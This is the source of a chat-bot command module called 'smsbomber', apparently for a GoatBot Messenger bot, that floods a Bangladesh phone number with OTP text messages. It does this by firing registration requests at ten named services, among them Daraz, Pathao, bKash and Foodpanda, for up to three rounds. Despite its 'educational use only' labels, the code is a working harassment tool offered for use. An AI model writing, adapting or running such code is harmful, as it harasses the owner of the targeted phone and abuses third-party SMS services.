const axios = require("axios");

const OWNER_ID = "61575436812912";

function isAdminOrOwner(id) {
  if (String(id) === OWNER_ID) return true;
  return (global.GoatBot?.config?.adminBot || []).map(String).includes(String(id));
}

// SMS OTP endpoints — Bangladesh focused
async function sendBD(phone, log) {
  const local = phone.replace(/^\+?880/, "0").replace(/^00/, "");
  const intl = phone.replace(/^\+?/, "").replace(/^00/, "");
  const bd880 = intl.startsWith("880") ? intl : "880" + local.replace(/^0/, "");

  const endpoints = [
    {
      name: "Daraz BD",
      fn: () => axios.post("https://my.daraz.com.bd/api/otp/request", {
        phone: `+${bd880}`, type: "REGISTER"
      }, { timeout: 8000, headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" } })
    },
    {
      name: "Pathao BD",
      fn: () => axios.post("https://user.pathao.com/api/v1/auth/registration/send-otp", {
        phone: local
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
    {
      name: "Shohoz BD",
      fn: () => axios.post("https://api.shohoz.com/api/user/registration/send-otp", {
        phone: local, country_code: "+880"
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
    {
      name: "Chaldal",
      fn: () => axios.post("https://chaldal.com/api/Customer/SendVerificationSMS", {
        phone: local
      }, { timeout: 8000, headers: { "Content-Type": "application/json", "Referer": "https://chaldal.com/" } })
    },
    {
      name: "Bkash Register",
      fn: () => axios.post("https://www.bkash.com/en/api/registration/sendotp", {
        mobileNo: local, type: "registration"
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
    {
      name: "Hungama Music",
      fn: () => axios.post("https://api.hungama.com/user/register/sms", {
        mobile: `+${bd880}`, country_code: "880"
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
    {
      name: "Foodpanda BD",
      fn: () => axios.post("https://www.foodpanda.com.bd/api/v1/user/phone-verify", {
        phone: local, country_code: "+880"
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
    {
      name: "Shajgoj",
      fn: () => axios.post("https://www.shajgoj.com/wp-json/wc/v3/customers/send-otp", {
        phone: local
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
    {
      name: "Bikroy",
      fn: () => axios.post("https://bikroy.com/en/api/send-otp", {
        phone: bd880
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
    {
      name: "Priyoshop",
      fn: () => axios.post("https://api.priyoshop.com/api/v1/user/send-otp", {
        phone: local
      }, { timeout: 8000, headers: { "Content-Type": "application/json" } })
    },
  ];

  let sent = 0;
  for (const ep of endpoints) {
    try {
      await ep.fn();
      log.push(`✅ ${ep.name}`);
      sent++;
    } catch (e) {
      const status = e.response?.status;
      // Even 4xx can mean the request reached the server (and may have sent SMS)
      if (status && status !== 404 && status !== 503) {
        log.push(`⚡ ${ep.name} (${status})`);
        sent++;
      } else {
        log.push(`❌ ${ep.name}`);
      }
    }
    await new Promise(r => setTimeout(r, 300));
  }
  return sent;
}

module.exports = {
  config: {
    name: "smsbomber",
    aliases: ["smsb", "smsbomb", "otpbomb"],
    version: "1.0",
    author: "Rakib Islam",
    countDown: 30,
    role: 1,
    shortDescription: { en: "Send multiple OTP SMS to a number (Admin only)" },
    longDescription: { en: "Flood a Bangladesh phone number with OTP SMS from multiple services. Admin only. Educational use." },
    category: "admin",
    guide: {
      en: "{p}smsbomber <number> [rounds]\n\nExamples:\n{p}smsbomber 01711000000\n{p}smsbomber +8801711000000 3\n\n⚠️ Admin only | Educational use only | Max 3 rounds"
    }
  },

  onStart: async function ({ api, event, args, message }) {
    if (!isAdminOrOwner(event.senderID)) {
      return; // Silent ignore for non-admins
    }

    if (!args[0]) {
      return message.reply(
        `╔══════════════════════╗\n` +
        `║  💣 SMS OTP Bomber    ║\n` +
        `╚══════════════════════╝\n\n` +
        `📌 ব্যবহার:\n` +
        `  .smsbomber <number> [rounds]\n\n` +
        `📌 Examples:\n` +
        `  .smsbomber 01711000000\n` +
        `  .smsbomber +8801711000000 2\n\n` +
        `⚠️ Max 3 rounds | Admin only\n` +
        `⚠️ Educational use only!`
      );
    }

    let phone = args[0].trim();
    let rounds = Math.min(parseInt(args[1]) || 1, 3);

    // Normalize Bangladesh number
    phone = phone.replace(/\s/g, "");
    if (!phone.startsWith("+")) phone = "+" + phone.replace(/^00/, "");
    if (phone.startsWith("+0")) phone = "+880" + phone.slice(2);

    api.setMessageReaction("💣", event.messageID, () => {}, true);

    const startMsg = await message.reply(
      `💣 SMS Bomber Starting!\n` +
      `━━━━━━━━━━━━━━━━\n` +
      `  Target › ${phone}\n` +
      `  Rounds › ${rounds}\n` +
      `  APIs   › 10 endpoints per round\n` +
      `━━━━━━━━━━━━━━━━\n` +
      `⏳ Bombing...`
    );

    const allLogs = [];
    let totalSent = 0;

    for (let r = 1; r <= rounds; r++) {
      const roundLog = [];
      const sent = await sendBD(phone, roundLog);
      totalSent += sent;
      allLogs.push(`Round ${r}:\n` + roundLog.join("\n"));
      if (r < rounds) await new Promise(res => setTimeout(res, 2000));
    }

    api.setMessageReaction("✅", event.messageID, () => {}, true);

    const result =
      `╔══════════════════════╗\n` +
      `║  ✅ Bombing Complete!  ║\n` +
      `╚══════════════════════╝\n\n` +
      `  ✦ Target   › ${phone}\n` +
      `  ✦ Rounds   › ${rounds}\n` +
      `  ✦ SMS Sent › ~${totalSent * rounds}\n\n` +
      `${allLogs.join("\n\n")}\n\n` +
      `⚠️ Educational use only\n— Rakib Islam`;

    try { await api.unsendMessage(startMsg.messageID); } catch {}
    message.reply(result);
  }
};
